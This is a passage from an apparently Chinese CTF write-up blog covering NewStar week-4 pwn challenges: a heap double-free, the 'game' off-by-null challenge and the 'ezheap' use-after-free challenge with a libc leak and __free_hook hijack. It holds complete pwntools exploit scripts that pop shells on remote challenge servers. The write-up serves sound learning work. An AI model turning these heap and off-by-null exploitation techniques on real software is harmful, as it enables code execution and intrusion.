class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602070</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;2&#x27;</span>, p64(target-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># launch_gdb()</span></span><br><span class="line">add(<span class="string">b&#x27;3&#x27;</span>, <span class="string">b&#x27;cccccccc&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;4&#x27;</span>, <span class="string">b&#x27;dddddddd&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;5&#x27;</span>, p64(<span class="number">0x666</span>))</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-game"><a href="#0x02-game" class="headerlink" title="0x02 game"></a>0x02 game</h3><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>都是mihoyo害了出题人（不是<br>这道题很有意思，主要考察的是off by null的知识点，藏得蛮隐蔽的，可能是我对这种漏洞还不够熟悉。先来看看主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  choice(&amp;v6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_2060);                             <span class="comment">// 现在你可以开始探险了</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(a1);                               <span class="comment">// 扣1送原石</span></span><br><span class="line">        <span class="built_in">puts</span>(a2);                               <span class="comment">// 扣2送kfc联名套餐</span></span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )                          <span class="comment">// 如果选了三月七则没得送原石</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">1</span>;</span><br><span class="line">          v7 += <span class="number">0x10000</span>;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_20A8);                     <span class="comment">// 恭喜你完成一次委托</span></span><br><span class="line">          <span class="keyword">if</span> ( v7 &gt; <span class="number">0x3FFFF</span> )</span><br><span class="line">            <span class="built_in">printf</span>(&amp;format, &amp;system);           <span class="comment">// 打印出system的libc地址</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);                        <span class="comment">// 选派蒙不能选KFC套餐</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">puts</span>(&amp;byte_2108);                       <span class="comment">// 有什么想对肯德基爷爷说的吗?</span></span><br><span class="line">        myread(v5, <span class="number">8LL</span>);                        <span class="comment">// 把\n换成了\x00</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 != <span class="number">1</span> || v8 != <span class="number">1</span> )                   <span class="comment">// 1,2两个选项至少要分别执行一遍,利用off by null来实现</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you are good mihoyo player!&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v3);                 <span class="comment">// %hd是短整型</span></span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))((<span class="type">char</span> *)&amp;<span class="built_in">puts</span> - v3 - v7))(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>choice函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">choice</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);                                     <span class="comment">// 请选择你的伙伴</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);                          <span class="comment">// 只能选1或0</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_203D);                           <span class="comment">// 三月七</span></span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_2021);                           <span class="comment">// 派蒙</span></span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>myread函数，也是这个程序的漏洞所在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">myread</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> *a1;</span><br><span class="line">    &#125;</span><br><span class="line">    *++a1 = <span class="number">0</span>;                                  <span class="comment">// off by null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (__int64)a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>myread自定义了读取函数，对输入的字符串做了截断处理，但是强行增加一个截断符在字符串后面就导致了一个null字节的溢出。主函数中储存读取的字符串的数组是v5，长度是8，在栈上紧接着就是变量v6,用来储存角色的选择。所以也就是说这个off by null可以使v6变成0。<br>我们再来看主函数，首先选择角色，然后选择任务，但是对应角色只能做对应任务。其中选择派蒙，做满4次任务1就可以得到system地址，而选择三月七做任务2则可以触发myread函数的执行。在任务处如果选择3，如果1和2任务都做过，那么就可以执行&amp;puts - v3 - v7处的函数，并且以v5为参数。这里的puts地址指的是libc的地址，很容易就能想到构造system(&#x2F;bin&#x2F;sh)来getshell。但是角色只能选一次，想要两个任务都做到触发这个函数指针的调用，只能利用刚刚发现的off by null的漏洞。<br>首先角色先选1，然后做任务2，传入&#x2F;bin&#x2F;sh给v5，一定要保证输入字节够8个，才能溢出一个null给v6。这时候就可以做任务1了。如果题目附件没给libc文件，则需要做四次任务1来获得靶机的system地址以找到对应的libc版本。但是这里题目附件给了libc文件，所以直接通过symbols方法就能获取libc中puts和system的偏移，不需要真的执行4次（当然除非偏移很大真的需要或者你想要这么做除外。）这里需要注意一下一个地方，可能是我太久没做pwn题了，一开始思考偏移的时候我竟然想着要用extern段的相对位置，也就是下图0x4090和0x4058的差值。但是其实程序在运行时链接动态库后，这里会指向got表，也就是libc的地址，所以要找偏移要找libc中的偏移。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/game_extern%E6%AE%B5.png" alt="game_extern段"></p><p>通过以下语句可以得到地址偏移是0x32190</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br></pre></td></tr></table></figure><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&quot;./game&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28734</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>]))  <span class="comment"># 0x32190</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendla</span>(<span class="params">content</span>):</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(content.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendla(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sendla(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sendla(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sendla(<span class="built_in">str</span>(<span class="number">0x2190</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x03-ezheap"><a href="#0x03-ezheap" class="headerlink" title="0x03 ezheap"></a>0x03 ezheap</h3><p>这题是看着官方WP复现的，主要漏洞是UAF，还学了一些新的知识。这题也是一道经典的菜单堆题。一共可以申请16个note，每个note由一个chunk来维护note信息，我们称为data，和一个chunk来储存note内容，我们把他叫做content。</p><h5 id="结构体的恢复"><a href="#结构体的恢复" class="headerlink" title="结构体的恢复"></a>结构体的恢复</h5><p>根据add函数的代码不难推测data用来存放一个结构体，前八个字节用来存size，最后八个字节用来存content的地址，中间则为0。我们可以在IDA中恢复这个结构体：</p><p>先在structure页面创建对应结构体<br><img src="https://c-lby.github.io/images/newstar_week4_wp/ezheap%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="ezheap结构体"><br>然后将notebook的数据类型改为struct Data*<br><img src="https://c-lby.github.io/images/newstar_week4_wp/ezheap%E6%9B%B4%E6%94%B9%E7%BB%93%E6%9E%84%E4%BD%93%E7%B1%BB%E5%9E%8B.png" alt="ezheap更改结构体类型"><br>这样代码看起来会顺眼一点。</p><h5 id="UAF漏洞的利用"><a href="#UAF漏洞的利用" class="headerlink" title="UAF漏洞的利用"></a>UAF漏洞的利用</h5><p>程序还会将一个note的size存在notesize数组里，显然程序里会有一个关于size的简单的检查。我们再看delete函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = read_idx();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)idx &lt; <span class="number">0x10</span> &amp;&amp; *(&amp;notebook + idx) )<span class="comment">// 没清空结构体</span></span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notebook + idx));                   <span class="comment">// UAF漏洞，而且没释放写过的content的地址，只释放了notebook数据的chunk</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UAF漏洞给了我们机会可以申请到某个note的data处，这样可以对data进行打印或者修改，达到读写的目的。因为delete的时候程序只释放了data而没有释放content，所以我们只要先释放两个note，然后再申请一个和data一样大小的note，这样新的content就是第一个释放的data。</p><h5 id="libc地址的泄露"><a href="#libc地址的泄露" class="headerlink" title="libc地址的泄露"></a>libc地址的泄露</h5><p>题目给了libc文件，很自然可以想到要泄露libc地址然后劫持某个函数为system就好了。官方WP给出的泄露libc地址的方法是，申请一个mmap大小范围的chunk，这个chunk的地址和libc靠得很近，打印这个note的data通过计算就可以得到libc基址。然后去网上学习了一下关于mmap申请内存的知识，得知malloc时如果申请的内存大于128kb就会交给mmap来分配，而他管理的内存是一个独立的内存页，刚好在libc加载地址的上面（低地址处）。自己写程序试验了一下，确实mmap分配的地址和0x7fxxxxxxxx很近：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mmap allocated at: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">char</span> *b = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brk allocated at: %p\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Mmap</span> allocated at: <span class="number">0x7fc84bc85010</span></span><br><span class="line"><span class="type">Brk</span> allocated at: <span class="number">0x555acfc816b0</span></span><br></pre></td></tr></table></figure><p>WP给出接收libc基址的语句是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base=u64(recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x41000</span></span><br></pre></td></tr></table></figure><p>这里的-0x10是从mem到chunk地址的计算，+0x40000显然是刚刚申请的mmap内存大小，但是这个0x1000是哪来的呢？花了半个小时去翻了glibc2.31的源码（实际上我并不知道是哪个版本的glibc，但其实根据给出的libc文件中函数偏移应该是可以确定的），最后在sysmalloc函数里找到了相关的语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">         If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">         with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">         this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">         previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">size = ALIGN_UP (size, pagesize);</span><br></pre></td></tr></table></figure><p>mmap申请的chunk有一个特殊的对齐要求，他必须是pagesize，也就是0x1000的倍数。比方说我申请了一个0x40000大小的chunk，加上存放chunk数据的0x10，就有0x40010大小，要对齐，最终就会分配出0x41000大小的chunk。</p><h5 id="劫持-free-hook-getshell"><a href="#劫持-free-hook-getshell" class="headerlink" title="劫持__free_hook &amp; getshell"></a>劫持__free_hook &amp; getshell</h5><p>回到题目，泄露了libc后，就要考虑system的执行了。这里的libc版本是2.31（通过偏移可以查），所以可以通过劫持__free_hook来getshell。</p><p>__free_hook对我来说也是个新东西，因为我开始学习的2.35版本glibc已经取消了hook函数。hook钩子是一个弱类型的函数指针，它指向free(), malloc()等函数。比如__free_hook，若它不为空，则执行它所指向的函数。所以我们可以通过劫持hook来改变程序的执行流。</p><p>题目里data处存放着content的地址指向content，那么我们可以构造__free_hook指向system的libc地址。edit函数会对data的size字段做检查，所以修改指针的时候要注意保留size不变，这样才能成功修改content为system地址，最后再修改一个data为&#x2F;bin&#x2F;sh然后delete掉这个chunk就getshell了。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># 偏移测试libc版本</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># 偏移测试libc版本</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28306</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;write the note: &#x27;</span>)</span><br><span class="line">    r.sendline(content.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x50000</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span 